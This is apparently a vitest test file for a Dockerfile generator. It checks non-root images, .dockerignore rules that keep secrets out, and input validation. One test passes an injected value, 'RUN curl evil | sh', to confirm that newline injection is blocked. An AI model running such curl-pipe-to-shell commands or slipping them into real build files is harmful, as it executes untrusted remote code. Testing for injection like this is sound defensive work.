import { describe, expect, it } from 'vitest';
import { defaultsFor, generate, PRESETS, type DockerOptions, type Preset } from '../../../src/tools/dockerfile-generator/features/dockerfile-generator';

const gen = (preset: Preset, over: Partial<DockerOptions> = {}) => generate({ ...defaultsFor(preset), comments: false, ...over });
const ALL = Object.keys(PRESETS) as Preset[];

describe('every preset', () => {
  it('generates from its defaults with a reason for each instruction', () => {
    for (const p of ALL) {
      const r = gen(p);
      expect(r.errors, p).toEqual({});
      expect(r.dockerfile.startsWith('# syntax=docker/dockerfile:1\n'), p).toBe(true);
      expect(r.dockerfile, p).toMatch(/^(CMD|ENTRYPOINT) |FROM nginxinc/m);
      for (const l of r.lines) if (l.text) expect(l.why, `${p}: ${l.text}`).toBeTruthy();
    }
  });
  it('never runs the final stage as root', () => {
    for (const p of ALL) {
      const r = gen(p);
      const final = r.dockerfile.slice(r.dockerfile.lastIndexOf('\nFROM '));
      expect(/^USER (?!root)/m.test(final) || /nginx-unprivileged|distroless\/static-debian12:nonroot/.test(final), p).toBe(true);
    }
  });
  it('writes a .dockerignore that keeps secrets and dependencies out', () => {
    for (const p of ALL) {
      const ig = gen(p).dockerignore;
      expect(ig, p).toMatch(/^\.env$/m);
      expect(ig, p).toMatch(/^!\.env\.example$/m);
      expect(ig, p).toMatch(/^\.git$/m);
    }
    expect(gen('node').dockerignore).toMatch(/^node_modules$/m);
    expect(gen('python').dockerignore).toMatch(/^__pycache__$/m);
    expect(gen('maven').dockerignore).toMatch(/^target$/m);
  });
  it('always warns about secrets and version freshness', () => {
    for (const p of ALL) {
      const notes = gen(p).notes.join(' ');
      expect(notes, p).toMatch(/Never put secrets/);
      expect(notes, p).toMatch(/last reviewed/);
    }
  });
});

describe('templates', () => {
  it('Node: lockfile first, ci install, prune, non-root, exec-form CMD', () => {
    const d = gen('node', { port: '4000' }).dockerfile;
    expect(d).toContain('COPY package.json package-lock.json ./\nRUN npm ci');
    expect(d.indexOf('RUN npm ci')).toBeLessThan(d.indexOf('COPY . .'));
    expect(d).toContain('RUN npm prune --omit=dev');
    expect(d).toContain('COPY --from=build --chown=node:node /app ./');
    expect(d).toContain('EXPOSE 4000');
    expect(d).toContain("fetch('http://127.0.0.1:4000/health')");
    expect(d).toContain('CMD ["node", "dist/server.js"]');
    expect(gen('node', { packageManager: 'pnpm' }).dockerfile).toContain('RUN corepack enable');
    expect(gen('node', { multiStage: false }).dockerfile.match(/^FROM /gm)).toHaveLength(1);
  });
  it('falls back to shell form for shell syntax and says so', () => {
    const r = gen('node', { start: 'node server.js && echo done' });
    expect(r.dockerfile).toContain('CMD node server.js && echo done');
    expect(r.notes.join(' ')).toMatch(/shell form/);
  });
  it('SPA: build with Node, serve with nginx and a try_files fallback', () => {
    const d = gen('vite').dockerfile;
    expect(d).toContain('FROM node:22-alpine AS build');
    expect(d).toContain('COPY --from=build /app/dist /usr/share/nginx/html');
    expect(d).toContain('try_files $uri $uri/ /index.html;');
    expect(d).toContain('wget -qO- http://127.0.0.1:8080/ ');
  });
  it('Python: venv in a build stage, port substituted in the start command', () => {
    const d = gen('fastapi', { port: '9000' }).dockerfile;
    expect(d).toContain('RUN python -m venv /opt/venv');
    expect(d).toContain('COPY --from=build /opt/venv /opt/venv');
    expect(d).toContain('CMD ["uvicorn", "main:app", "--host", "0.0.0.0", "--port", "9000"]');
    expect(d).toContain('USER app');
  });
  it('Go: static binary on distroless, no healthcheck but a note', () => {
    const r = gen('go');
    expect(r.dockerfile).toContain('CGO_ENABLED=0 go build');
    expect(r.dockerfile).toContain('FROM gcr.io/distroless/static-debian12:nonroot');
    expect(r.dockerfile).not.toContain('HEALTHCHECK');
    expect(r.notes.join(' ')).toMatch(/distroless has no shell/);
  });
  it('Java: build with Maven, run on a JRE', () => {
    const d = gen('maven').dockerfile;
    expect(d).toContain('FROM maven:3.9-eclipse-temurin-21 AS build');
    expect(d).toContain('FROM eclipse-temurin:21-jre');
    expect(d).toContain('ENTRYPOINT ["java", "-jar", "/app/app.jar"]');
  });
  it('writes explanations as comments when asked', () => {
    expect(gen('node', { comments: true }).dockerfile).toMatch(/# Installs exactly the versions in the lockfile\.\nRUN npm ci/);
  });
});

describe('validation', () => {
  it('rejects bad values and generates nothing', () => {
    const r = gen('node', { version: 'latest', port: '70000', workdir: 'app', start: '', healthPath: 'health' });
    expect(Object.keys(r.errors).sort()).toEqual(['healthPath', 'port', 'start', 'version', 'workdir']);
    expect(r.dockerfile).toBe('');
  });
  it('blocks newlines that could inject instructions', () => {
    expect(gen('node', { build: 'npm run build\nRUN curl evil | sh' }).errors.build).toBeTruthy();
    expect(gen('vite', { output: 'dist /etc' }).errors.output).toBeTruthy();
  });
});
